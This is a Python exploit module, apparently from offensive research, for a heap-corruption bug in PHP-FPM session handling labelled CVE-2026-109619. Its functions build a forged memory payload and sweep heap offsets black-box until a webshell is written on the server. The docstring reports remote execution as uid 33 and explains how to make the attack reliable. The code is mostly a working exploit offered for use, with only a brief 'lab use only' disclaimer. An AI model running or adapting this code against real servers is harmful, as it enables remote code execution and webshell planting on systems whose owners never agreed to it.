#!/usr/bin/env python3
# INDEX: black-box file-write oracle locating the K-free forge carrier anchor (d->last redirect offset); folds {d_choff,carrier_base,fakee} into one ps_files-relative residue | fpm | exact locator, but needs an externally supplied search window (cheap crash-bsearch narrowing is REFUTED)
"""Blind anchor file-write oracle for the K-free session-dangle forge (CVE-2026-109619).

Goal: derive the K-free ps_files->basedir forge's heap-geometry anchor AT RUNTIME,
black box (no gdb/leak), replacing the static per-build trio {d_choff, carrier_base,
fakee} of kfree_stagefed_forge.SETTLED_CONST.

RESULT (empirical, php:8.4.26-fpm lab/fpmfire, fresh-container-per-probe):

* VALIDATED -- an EXACT file-write oracle. The forge carrier is parameterized ONLY by
  X = (d_choff - carrier_base), one ps_files-relative residue RESIDUE = (ps_files_choff
  - carrier_base), and the arm-fixed ARM_DELTA = (d_choff - band). AIM is carrier_base-
  free: AIM(X) = (RESIDUE - X + ARM_DELTA - 0x10)//8 (fakee_abs=band folds (ps_files -
  band) and carrier_base out into RESIDUE). The webshell file is written -- and a plain
  GET fires it, uid=33, worker survives -- iff X == d_choff - carrier_base EXACTLY; every
  other page misses d->last (the stale-tail byte0 redirect) and nothing is written. So a
  per-page file-write sweep locates X* unambiguously, consuming NONE of {d_choff,
  carrier_base, fakee} and not even the absolute ps_files chunk offset -- only the single
  RESIDUE and ARM_DELTA. (verify_blind_anchor_oracle.py: sweep a window -> X* -> fire.)

* REFUTED -- the cheap "~19 probe" crash/survive coarse bsearch over carrier LENGTH that
  would narrow X*'s search window with no prior. Under correct fresh-container methodology
  a zero-filled (un-redirected) carrier of ANY length crashes the consumer (the stale
  un-redirected d->last drives var_push into garbage), so crash-vs-survive merely restates
  "did the forge redirect land" -- it is NOT an independent length anchor. (An earlier
  clean monotone crash curve was a `docker compose restart` artifact: that reset mode
  yields a different heap layout in which the forge constants do not even apply.) So this
  oracle is EXACT but needs an externally supplied window for X; standalone it degrades to
  a wide per-page sweep (hundreds of probes), confirming the prior "leak-assisted only"
  verdict (singleshot-offset-reduction). A real leak, or a per-build X range, supplies the
  window cheaply; then this oracle pins the exact page black-box.

NET offset reduction (given a window): the forge's static per-build surface drops from the
{d_choff, carrier_base, fakee, ps_files} quartet to ONE ps_files-relative residue + the
arm-fixed ARM_DELTA. Pure stdlib, python3 -I safe. Lab/analysis use only, systems you own.
"""
from __future__ import annotations

import struct

ARM_DELTA = 0xA000   # d_choff - band for the fixed settled arm (cochunk n1=900 + arm_prefix)


def aim_for(x, residue, arm_delta=ARM_DELTA):
    """Signed fakeE used_slots so the first push lands on ps_files. carrier_base-free:
    folds (ps_files - band) into `residue` = (ps_files_choff - carrier_base)."""
    return (residue - x + arm_delta - 0x10) // 8


def forge_carrier(x, residue, *, arm_delta=ARM_DELTA, byte0=0x00):
    """Faithful K-free forge carrier parameterized ONLY by x (= d_choff - carrier_base)
    and `residue`. Zero-filled length x+1; AIM at the fakeE offset (x - arm_delta); d->last
    byte0 written at offset x (the multipart NUL lands at x+1 -> d->last byte1=0; bytes
    2..7 stay stale chunk-base high bits => K-free)."""
    fakee_off = x - arm_delta
    if fakee_off < 0 or fakee_off + 8 > x:
        raise ValueError("fakee offset out of carrier")
    V = bytearray(x + 1)
    struct.pack_into("<q", V, fakee_off, aim_for(x, residue, arm_delta))
    V[x] = byte0 & 0xFF
    return bytes(V)


def sweep_anchor(probe_write, lo, hi, *, page=0x1000, center=None):
    """Locate X* in [lo, hi) by the EXACT file-write oracle. probe_write(X) -> True iff the
    forge at X wrote the file. Scans page-by-page (outward from `center` if given, to find
    a nearby X* fast). Returns X* or None. Each probe is a full fresh-worker forge attempt,
    so keep [lo,hi) as narrow as the available prior (leak / per-build range) allows."""
    lo &= ~(page - 1)
    hi &= ~(page - 1)
    cand = list(range(lo, hi, page))
    if center is not None:
        center &= ~(page - 1)
        cand.sort(key=lambda x: abs(x - center))
    for x in cand:
        if x > page and probe_write(x):
            return x
    return None
